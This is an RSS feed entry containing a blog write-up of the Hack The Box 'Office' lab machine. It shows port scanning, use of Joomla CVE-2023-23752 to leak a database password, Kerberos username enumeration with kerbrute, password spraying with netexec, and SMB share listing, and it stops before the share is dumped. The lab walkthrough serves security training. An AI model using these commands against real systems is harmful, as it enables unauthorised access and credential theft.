<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss"><channel><title>Dpapi on Shakil's Blog</title><link>https://hshakilst.github.io/tags/dpapi/</link><description>Recent content in Dpapi on Shakil's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>Shakil Hossain - All Right Reserved.</copyright><lastBuildDate>Thu, 16 May 2024 17:00:43 +0200</lastBuildDate><atom:link href="https://hshakilst.github.io/tags/dpapi/index.xml" rel="self" type="application/rss+xml"/><icon>https://hshakilst.github.io/logo.svg</icon><item><title>HTB Machine Office</title><link>https://hshakilst.github.io/posts/htb-machines/office/</link><pubDate>Thu, 16 May 2024 17:00:43 +0200</pubDate><guid>https://hshakilst.github.io/posts/htb-machines/office/</guid><description><![CDATA[<h1 id="office---htbhttpsapphacktheboxcommachinesoffice">Office - <a href="https://app.hackthebox.com/machines/Office">HTB</a></h1>
<p><img src="images/image.png" alt="alt text"></p>
<h2 id="recon">Recon</h2>
<h3 id="nmap">Nmap</h3>
<table>
<thead>
<tr>
<th>Port</th>
<th>State</th>
<th>Service</th>
<th>Version</th>
</tr>
</thead>
<tbody>
<tr>
<td>53/tcp</td>
<td>open</td>
<td>domain</td>
<td>Simple DNS Plus</td>
</tr>
<tr>
<td>80/tcp</td>
<td>open</td>
<td>http</td>
<td>httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)</td>
</tr>
<tr>
<td>88/tcp</td>
<td>open</td>
<td>kerberos-sec</td>
<td>Microsoft Windows Kerberos</td>
</tr>
<tr>
<td>139/tcp</td>
<td>open</td>
<td>netbios-ssn</td>
<td>Microsoft Windows netbios-ssn</td>
</tr>
<tr>
<td>389/tcp</td>
<td>open</td>
<td>ldap</td>
<td>Microsoft Windows Active Directory LDAP</td>
</tr>
<tr>
<td>443/tcp</td>
<td>open</td>
<td>ssl/http</td>
<td>Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)</td>
</tr>
<tr>
<td>445/tcp</td>
<td>open</td>
<td>microsoft-ds?</td>
<td></td>
</tr>
<tr>
<td>464/tcp</td>
<td>open</td>
<td>kpasswd5?</td>
<td></td>
</tr>
<tr>
<td>593/tcp</td>
<td>open</td>
<td>ncacn_http</td>
<td>Microsoft Windows RPC over HTTP 1.0</td>
</tr>
<tr>
<td>636/tcp</td>
<td>open</td>
<td>ssl/ldap</td>
<td>Microsoft Windows Active Directory LDAP</td>
</tr>
<tr>
<td>3268/tcp</td>
<td>open</td>
<td>ldap</td>
<td>Microsoft Windows Active Directory LDAP</td>
</tr>
<tr>
<td>3269/tcp</td>
<td>open</td>
<td>ssl/ldap</td>
<td>Microsoft Windows Active Directory LDAP</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p>Host Script Results:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>| smb2-security-mode: 
</span></span><span style="display:flex;"><span>|   3:1:1: 
</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
</span></span><span style="display:flex;"><span>| p2p-conficker: 
</span></span><span style="display:flex;"><span>|   Checking for Conficker.C or higher...
</span></span><span style="display:flex;"><span>|   Check 1 (port 15731/tcp): CLEAN (Timeout)
</span></span><span style="display:flex;"><span>|   Check 2 (port 48612/tcp): CLEAN (Timeout)
</span></span><span style="display:flex;"><span>|   Check 3 (port 52719/udp): CLEAN (Timeout)
</span></span><span style="display:flex;"><span>|   Check 4 (port 54522/udp): CLEAN (Timeout)
</span></span><span style="display:flex;"><span>|_  0/4 checks are positive: Host is CLEAN or ports are blocked
</span></span><span style="display:flex;"><span>|_clock-skew: 7h55m29s
</span></span><span style="display:flex;"><span>| smb2-time: 
</span></span><span style="display:flex;"><span>|   date: 2024-04-28T22:53:10
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span></code></pre></div><p>I think it will be better if we fix our clock-skew that is almost 8 hours. To do that let&rsquo;s run the following command.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo ntpdate -u 10.10.11.3
</span></span></code></pre></div></li>
</ul>
<h2 id="enumeration">Enumeration</h2>
<h3 id="http-enumeration">HTTP Enumeration</h3>
<ul>
<li>
<p><strong>Joomla CMS 4.2 - CVE-2023-23752</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ curl http://office.htb/README.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Joomla! CMS™
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>1- Overview
</span></span><span style="display:flex;"><span>	* This is a Joomla! 4.x installation/upgrade package.
</span></span><span style="display:flex;"><span>	* Joomla! Official site: https://www.joomla.org
</span></span><span style="display:flex;"><span>	* Joomla! 4.2 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_4.2_version_history
</span></span><span style="display:flex;"><span>	* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/4.2-dev
</span></span></code></pre></div><p>This version is vulnerable to Unauthenticated information disclosure (CVE-2023-23752) due to Improper access check. So we can access some restricted endpoints.</p>
<p><strong>Users</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ curl http://office.htb/api/index.php/v1/users?public=true
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{&#34;links&#34;:{&#34;self&#34;:&#34;http:\/\/office.htb\/api\/index.php\/v1\/users?public=true&#34;},&#34;data&#34;:[{&#34;type&#34;:&#34;users&#34;,&#34;id&#34;:&#34;474&#34;,&#34;attributes&#34;:{&#34;id&#34;:474,&#34;name&#34;:&#34;Tony Stark&#34;,&#34;username&#34;:&#34;Administrator&#34;,&#34;email&#34;:&#34;Administrator@holography.htb&#34;,&#34;block&#34;:0,&#34;sendEmail&#34;:1,&#34;registerDate&#34;:&#34;2023-04-13 23:27:32&#34;,&#34;lastvisitDate&#34;:&#34;2024-04-26 19:43:46&#34;,&#34;lastResetTime&#34;:null,&#34;resetCount&#34;:0,&#34;group_count&#34;:1,&#34;group_names&#34;:&#34;Super Users&#34;}}],&#34;meta&#34;:{&#34;total-pages&#34;:1}}
</span></span></code></pre></div><p><strong>Application Config</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#ff79c6">$</span> curl http:<span style="color:#ff79c6">//</span>office<span style="color:#ff79c6">.</span>htb<span style="color:#ff79c6">/</span>api<span style="color:#ff79c6">/</span>index<span style="color:#ff79c6">.</span>php<span style="color:#ff79c6">/</span>v1<span style="color:#ff79c6">/</span>config<span style="color:#ff79c6">/</span>application?public<span style="color:#ff79c6">=</span>true
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{<span style="color:#f1fa8c">&#34;links&#34;</span>:{<span style="color:#f1fa8c">&#34;self&#34;</span>:<span style="color:#f1fa8c">&#34;http:\/\/office.htb\/api\/index.php\/v1\/config\/application?public=true&#34;</span>,<span style="color:#f1fa8c">&#34;next&#34;</span>:<span style="color:#f1fa8c">&#34;http:\/\/office.htb\/api\/index.php\/v1\/config\/application?public=true&amp;page%5Boffset%5D=20&amp;page%5Blimit%5D=20&#34;</span>,<span style="color:#f1fa8c">&#34;last&#34;</span>:<span style="color:#f1fa8c">&#34;http:\/\/office.htb\/api\/index.php\/v1\/config\/application?public=true&amp;page%5Boffset%5D=60&amp;page%5Blimit%5D=20&#34;</span>},<span style="color:#f1fa8c">&#34;data&#34;</span>:[{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;offline&#34;</span>:false,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;offline_message&#34;</span>:<span style="color:#f1fa8c">&#34;This site is down for maintenance.&lt;br&gt;Please check back again soon.&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;display_offline_message&#34;</span>:<span style="color:#bd93f9">1</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;offline_image&#34;</span>:<span style="color:#f1fa8c">&#34;&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;sitename&#34;</span>:<span style="color:#f1fa8c">&#34;Holography Industries&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;editor&#34;</span>:<span style="color:#f1fa8c">&#34;tinymce&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;captcha&#34;</span>:<span style="color:#f1fa8c">&#34;0&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;list_limit&#34;</span>:<span style="color:#bd93f9">20</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;access&#34;</span>:<span style="color:#bd93f9">1</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;debug&#34;</span>:false,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;debug_lang&#34;</span>:false,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;debug_lang_const&#34;</span>:true,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;dbtype&#34;</span>:<span style="color:#f1fa8c">&#34;mysqli&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;host&#34;</span>:<span style="color:#f1fa8c">&#34;localhost&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;user&#34;</span>:<span style="color:#f1fa8c">&#34;root&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;password&#34;</span>:<span style="color:#f1fa8c">&#34;H0lOgrams4reTakIng0Ver754!&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;db&#34;</span>:<span style="color:#f1fa8c">&#34;joomla_db&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;dbprefix&#34;</span>:<span style="color:#f1fa8c">&#34;if2tx_&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;dbencryption&#34;</span>:<span style="color:#bd93f9">0</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;dbsslverifyservercert&#34;</span>:false,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}}],<span style="color:#f1fa8c">&#34;meta&#34;</span>:{<span style="color:#f1fa8c">&#34;total-pages&#34;</span>:<span style="color:#bd93f9">4</span>}}
</span></span></code></pre></div><p><strong>Credentials</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>root:H0lOgrams4reTakIng0Ver754!
</span></span></code></pre></div><p>At a first glance it looks like a credential for the database of the Joomla Service. I tried to login using the cred to Joomla Admin panel no luck there.</p>
</li>
</ul>
<h3 id="ad-enumeration">AD Enumeration</h3>
<p>Using the above credential I tried to login using SMB, LDAP no luck there too. Because I only possesed one username <code>Administrator</code>, having only this will not help. I had a password so I can try password spraying attack on the AD but I needed some valid usernames.</p>
<p>Because <code>kerberos</code> is enabled on the machine it can help us to gather usernames. Because by default I think kerberos authentication on AD returns a unique error for usernames that don&rsquo;t exist.</p>
<ul>
<li>
<p><strong>User Enumeration (kerberos)</strong></p>
<p>Using <a href="https://github.com/ropnop/kerbrute">kerbrute by ropnop</a> I tested a list of users against kerberos and tried to find some valid usernames.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#ff79c6">$</span> kerbrute userenum <span style="color:#ff79c6">--</span>dc dc<span style="color:#ff79c6">.</span>office<span style="color:#ff79c6">.</span>htb <span style="color:#ff79c6">-</span>d office<span style="color:#ff79c6">.</span>htb <span style="color:#ff79c6">~/</span>SecLists<span style="color:#ff79c6">/</span>Usernames<span style="color:#ff79c6">/</span>xato<span style="color:#ff79c6">-</span>net<span style="color:#ff79c6">-</span><span style="color:#bd93f9">10</span><span style="color:#ff79c6">-</span>million<span style="color:#ff79c6">-</span>usernames<span style="color:#ff79c6">.</span>txt <span style="color:#ff79c6">-</span>o kerbrute<span style="color:#ff79c6">.</span>log
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    __             __               __     
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span>_____  _____<span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span>_  _______  __<span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span>____ 
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">//</span>_<span style="color:#ff79c6">/</span> _ \<span style="color:#ff79c6">/</span> ___<span style="color:#ff79c6">/</span> __ \<span style="color:#ff79c6">/</span> ___<span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span> __<span style="color:#ff79c6">/</span> _ \
</span></span><span style="display:flex;"><span> <span style="color:#ff79c6">/</span> ,<span style="color:#ff79c6">&lt;</span> <span style="color:#ff79c6">/</span>  __<span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span>  <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span>_<span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span>  <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span>_<span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span>_<span style="color:#ff79c6">/</span>  __<span style="color:#ff79c6">/</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">/</span>_<span style="color:#ff79c6">/|</span>_<span style="color:#ff79c6">|</span>\___<span style="color:#ff79c6">/</span>_<span style="color:#ff79c6">/</span>  <span style="color:#ff79c6">/</span>_<span style="color:#ff79c6">.</span>___<span style="color:#ff79c6">/</span>_<span style="color:#ff79c6">/</span>   \__,_<span style="color:#ff79c6">/</span>\__<span style="color:#ff79c6">/</span>\___<span style="color:#ff79c6">/</span>                                        
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Version: dev (n<span style="color:#ff79c6">/</span>a) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">24</span> <span style="color:#ff79c6">-</span> Ronnie Flathers @ropnop
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">08</span>:<span style="color:#bd93f9">53</span> <span style="color:#ff79c6">&gt;</span>  Using KDC(s):
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">08</span>:<span style="color:#bd93f9">53</span> <span style="color:#ff79c6">&gt;</span>  	dc<span style="color:#ff79c6">.</span>office<span style="color:#ff79c6">.</span>htb:<span style="color:#bd93f9">88</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">09</span>:<span style="color:#bd93f9">30</span> <span style="color:#ff79c6">&gt;</span>  [<span style="color:#ff79c6">+</span>] VALID USERNAME:	 administrator@office<span style="color:#ff79c6">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">12</span>:<span style="color:#bd93f9">34</span> <span style="color:#ff79c6">&gt;</span>  [<span style="color:#ff79c6">+</span>] VALID USERNAME:	 Administrator@office<span style="color:#ff79c6">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">57</span> <span style="color:#ff79c6">&gt;</span>  [<span style="color:#ff79c6">+</span>] VALID USERNAME:	 ewhite@office<span style="color:#ff79c6">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">57</span> <span style="color:#ff79c6">&gt;</span>  [<span style="color:#ff79c6">+</span>] VALID USERNAME:	 etower@office<span style="color:#ff79c6">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">58</span> <span style="color:#ff79c6">&gt;</span>  [<span style="color:#ff79c6">+</span>] VALID USERNAME:	 dwolfe@office<span style="color:#ff79c6">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">59</span> <span style="color:#ff79c6">&gt;</span>  [<span style="color:#ff79c6">+</span>] VALID USERNAME:	 dlanor@office<span style="color:#ff79c6">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">59</span> <span style="color:#ff79c6">&gt;</span>  [<span style="color:#ff79c6">+</span>] VALID USERNAME:	 dmichael@office<span style="color:#ff79c6">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">54</span>:<span style="color:#bd93f9">19</span> <span style="color:#ff79c6">&gt;</span>  [<span style="color:#ff79c6">+</span>] VALID USERNAME:	 hhogan@office<span style="color:#ff79c6">.</span>htb
</span></span></code></pre></div><p>Now let&rsquo;s try <code>netexec</code> to spray the password using these usernames.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ nxc ldap dc.office.htb -u ad_users.txt -p &#39;H0lOgrams4reTakIng0Ver754!&#39;      
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>LDAP        10.10.11.3      389    dc.office.htb    [-] Error retrieving os arch of 10.10.11.3: Could not connect: timed out
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
</span></span><span style="display:flex;"><span>LDAP        10.10.11.3      389    DC               [-] office.htb\administrator:H0lOgrams4reTakIng0Ver754!
</span></span><span style="display:flex;"><span>LDAP        10.10.11.3      389    DC               [-] office.htb\Administrator:H0lOgrams4reTakIng0Ver754!
</span></span><span style="display:flex;"><span>LDAP        10.10.11.3      389    DC               [-] office.htb\ewhite:H0lOgrams4reTakIng0Ver754!
</span></span><span style="display:flex;"><span>LDAP        10.10.11.3      389    DC               [-] office.htb\etower:H0lOgrams4reTakIng0Ver754!
</span></span><span style="display:flex;"><span>LDAPS       10.10.11.3      636    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754!
</span></span></code></pre></div><p>Looks like I got a match for the user <code>dwolfe</code>. Let&rsquo;s enumerate his shares.</p>
</li>
<li>
<p><strong>SMB Enumeration</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ nxc smb dc.office.htb -u &#39;dwolfe&#39; -p &#39;H0lOgrams4reTakIng0Ver754!&#39; --shares
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754!
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               [*] Enumerated shares
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               Share           Permissions     Remark
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               -----           -----------     ------
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               ADMIN$                          Remote Admin
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               C$                              Default share
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               IPC$            READ            Remote IPC
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               NETLOGON        READ            Logon server share
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               SOC Analysis    READ            
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               SYSVOL          READ            Logon server share
</span></span></code></pre></div><p>I found an unusual share named <code>SOC Analysis</code> let&rsquo;s dump it using <code>smbclient</code>.</p>
